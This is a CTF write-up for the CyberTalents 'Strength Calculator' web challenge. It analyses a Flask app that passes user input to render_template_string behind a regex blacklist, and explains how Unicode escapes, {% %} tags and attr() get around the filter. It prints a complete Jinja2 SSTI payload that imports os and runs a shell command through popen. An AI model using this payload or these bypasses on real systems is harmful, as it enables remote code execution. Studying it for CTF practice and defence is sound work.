CyberTalents: Strength Calculator WEB CTF


Introduction
In this write-up, we’ll explore the Strength Calculator challenge from CyberTalents, a hard-difficulty web challenge .

At first glance, the application seems simple: it calculates the “strength” of a user’s name based on ASCII values. But underneath, it hides a Server-Side Template Injection (SSTI) vulnerability protected by a strict blacklist.

Press enter or click to view image in full size

Challenge Setup
Challenge URL:

Strength Calculator - Web Security challenge - CyberTalents
Practice now on Strength Calculator, one of the many Web Security challenges that CyberTalents offers to enhance your…
cybertalents.com

Press enter or click to view image in full size

Observations
The page is minimal:

Input field: “Name”
Calculate button
Output: displays user as “Guest” and a numerical “Strength”
Inspecting the page source reveals an interesting comment:

Press enter or click to view image in full size

Accessing /source allowed us to download the backend code (main.py), which gave critical insight into the vulnerability and the filtering mechanism.


Source Code Analysis
Here is the core logic of the application:

name = "Name : "+render_template_string(request.form["name"])
Key Takeaways
Server-Side Template Injection (SSTI)
The user input is passed directly to render_template_string().
Any Jinja2 template expressions in the input will be evaluated on the server.
This opens the door for arbitrary Python execution.
2. Blacklist Filtering

Input is filtered with the regex:
re.search("\{\{|\}\}|(popen)|(os)|(subprocess)|(application)|(getitem)|(flag.txt)|\.|_|\[|\]|\"|(class)|(subclasses)|(mro)", request.form["name"])
Blocks Jinja2 delimiters ({{ }})
Blocks OS command functions (os, popen, subprocess)
Blocks object introspection (class, subclasses, mro)
Blocks file access (flag.txt)
Blocks special characters (., _, [, ], ")
3. Admin Check

def isAdmin():
    return False
No administrative access through this route; SSTI is required for execution.

Write on Medium
4. Strength Calculation

def calculateStrength(name):
    strength = 0
    for _ in name:
        strength += ord(_)
    return str(strength)
This calculates ASCII sum of input characters.
Not directly relevant for exploitation but part of the output interface.
Understanding the Attack Surface
Why SSTI Works
Even with the blacklist, Jinja2 internals are still accessible:

Template objects have attributes like __init__, __globals__, __builtins__
Builtins include __import__, allowing module import
Modules like os can be used to execute commands
Bypassing the blacklist allows traversal of these objects to execute arbitrary Python code.

Bypass Strategy
The challenge’s main hurdle is the strict blacklist. Here’s how it was overcome.

1. Use {% %} Instead of {{ }}
{{ }} is blocked, but {% %} is allowed.
{% %} supports:
set (create variables)
print (output values)
Control structures like if, for
This allows us to evaluate expressions indirectly.
2. Use Unicode Escapes
Blacklisted terms like os, popen, __globals__, flag.txt can be encoded using Unicode escapes.
Example:
popen → p\u006fp\u0065n
__ → \u005f\u005f
. → \u002e
This bypasses regex detection while reconstructing strings during template execution.
use

CyberChef
The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis
gchq.github.io

Press enter or click to view image in full size

Escape unicode charachters
3. Use attr() Instead of Dot Notation
The dot . is blocked.
Jinja2 supports attr() to access attributes by name:
object|attr("attribute_name")
Combine this with Unicode escapes to access Python internals like __globals__ and __builtins__.
Step-by-Step Exploit
Step 1: Access Built-ins
{% set context = self
|attr('\u005f\u005finit\u005f\u005f')
|attr('\u005f\u005fglobals\u005f\u005f')
|attr('get')('\u005f\u005fbuiltins\u005f\u005f') %}
self: template object
__init__: constructor
__globals__: module globals
__builtins__: Python built-ins
Step 2: Import os Module
{% set python0s = context
|attr('get')('\u005f\u005fimport\u005f\u005f')
('o'+'s') %}
__import__ imported via builtins
'o'+'s' avoids triggering the os filter
Step 3: Execute Command
{% set command = python0s
|attr('p\u006fp\u0065n')
('cat /flag\u002etxt > static/f\u006cag\u002etxt') %}
popen() is accessed via Unicode escape
Executes shell command to write the flag to /static/flag.txt
flag.txt partially encoded to bypass blacklist
Step 4: Read Output
{% set result = command|attr('read')() %}
Reads output of the command
Step 5: Print Result
{% print result %}
Outputs the flag to the page
Complete Payload
{% set context = self|attr('\u005f\u005finit\u005f\u005f')|attr('\u005f\u005fglobals\u005f\u005f')|attr('get')('\u005f\u005fbuiltins\u005f\u005f') %}{% set python0s = context|attr('get')('\u005f\u005fimport\u005f\u005f')('o'+'s') %}{% set command = python0s|attr('p\u006fp\u0065n')('cat /flag\u002etxt > static/f\u006cag\u002etxt') %}{% set result = command|attr('read')() %}{% print result %}
Then access Location:

http://cdcamxwl32pue3e6mwl32pnnte3e6p6v40ye1cxzg-web.cybertalentslabs.com/static/flag.txt
Press enter or click to view image in full size
